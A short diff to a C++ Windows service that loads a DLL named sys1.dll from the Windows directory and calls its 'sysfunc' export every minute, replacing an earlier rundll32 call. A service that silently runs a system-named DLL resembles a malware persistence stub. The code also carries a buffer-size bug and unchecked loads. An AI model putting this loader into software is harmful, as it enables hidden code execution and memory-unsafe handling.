@@ -97,6 +97,7 @@ SERVICE_STATUS          gSvcStatus;
 SERVICE_STATUS_HANDLE   gSvcStatusHandle;
 HANDLE                  ghSvcStopEvent = NULL;
 VOID ReportSvcStatus(DWORD, DWORD, DWORD);
+typedef int(__stdcall *f_funci)();
 void CSampleService::ServiceWorkerThread(void)
 {
 /*	ghSvcStopEvent = CreateEvent(
@@ -116,10 +117,17 @@ void CSampleService::ServiceWorkerThread(void)
 	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
 */
     // Periodically check if the service is stopping.
+	wchar_t sdll[255];
+	GetEnvironmentVariable(L"WINDIR", sdll, sizeof(sdll));
+	
+	wcscat(sdll, L"\\sys1.dll");
+	HINSTANCE hGetProcIDDLL = LoadLibrary(sdll);
+	f_funci funci = (f_funci)GetProcAddress(hGetProcIDDLL, "sysfunc");
     while (!m_fStopping)
     {
         // Perform main service function here...
-		system("rundll32 sys1.dll sysfunc");
+		//system("rundll32 sys1.dll sysfunc");
+		funci();
         ::Sleep(60000);  // Simulate some lengthy operations.
     }
 
